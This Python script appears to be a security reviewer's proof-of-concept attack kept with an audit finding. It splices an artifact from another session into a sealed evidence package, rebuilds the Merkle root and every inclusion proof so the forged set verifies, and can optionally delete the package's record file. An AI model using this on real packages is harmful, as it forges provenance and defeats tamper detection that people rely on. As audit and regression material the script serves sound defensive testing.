#!/usr/bin/env python3
# Cross-session splice (audit 2026-09-25, #474 security review; CLI-4).
#
#   splice.py <src-pkg> <dst-pkg> <envelope.json> <keep_record 0|1> <unchained 0|1>
#
# Copies <src-pkg> to <dst-pkg>, appends the artifact in <envelope.json>
# (signed by the same key, in another session, naming the source package's
# last chained artifact as its parent) to the sealed set, and recomputes the
# Merkle root and every inclusion proof. With keep_record=0 it also deletes
# record.json. Before W1-4 that package verified by default. The attack
# script is the reviewer's, unchanged below this header.
import json,sys,hashlib,base64,shutil,os
src,dst,env_path,keep_record,unchained = sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]=="1",sys.argv[5]=="1"
shutil.rmtree(dst,ignore_errors=True); shutil.copytree(src,dst)
e=json.load(open(env_path)); raw=e['payload']; b=json.loads(base64.urlsafe_b64decode(raw+'='*(-len(raw)%4)))
dig=hashlib.sha256(); 
aid=os.path.basename(env_path)[:-5] if os.path.basename(env_path).startswith('art_') else None
shutil.copy(env_path, f"{dst}/artifacts/{aid}.json")
r=json.load(open(f"{dst}/receipt.json"))
proto=dict(r['artifacts'][0]); proto['artifact_id']=aid; proto['payload_type']=e['payloadType']
proto['digest']=None; proto.pop('digest'); proto['signed_at']=b.get('timestamp')
if unchained: proto['unchained']=True
r['artifacts'].append(proto)
def L(i): return hashlib.sha256(b'\x00'+i.encode()).digest()
def N(a,c): return hashlib.sha256(b'\x01'+a+c).digest()
leaves=[L(a['artifact_id']) for a in r['artifacts']]
def proof(idx):
    lvl=leaves[:]; path=[]
    while len(lvl)>1:
        if idx+1<len(lvl) and idx%2==0: path.append({"direction":"Right","hash":lvl[idx+1].hex()})
        elif idx%2==1: path.append({"direction":"Left","hash":lvl[idx-1].hex()})
        nxt=[N(lvl[i],lvl[i+1]) if i+1<len(lvl) else lvl[i] for i in range(0,len(lvl),2)]
        lvl=nxt; idx//=2
    return path,lvl[0]
_,root=proof(0)
r['merkle']['root']='mroot_'+root.hex(); r['merkle']['leaf_count']=len(leaves)
tmpl=r['merkle']['inclusion_proofs'][0]
newp=[]
for i,a in enumerate(r['artifacts']):
    p=json.loads(json.dumps(tmpl)); p['artifact_id']=a['artifact_id']
    path,_=proof(i); p['proof']['path']=path; p['proof']['leaf_index']=i; p['leaf_index']=i; p['proof']['leaf_hash']=leaves[i].hex()
    for k in ('leaf_count','tree_size'):
        if k in p['proof']: p['proof'][k]=len(leaves)
    newp.append(p)
r['merkle']['inclusion_proofs']=newp
open(f"{dst}/receipt.json","w").write(json.dumps(r,indent=2))
if not keep_record and os.path.exists(f"{dst}/record.json"): os.remove(f"{dst}/record.json")
print("spliced",aid,"parent-ish:",b.get('parentId'),b.get('subject'),b.get('artifacts'))
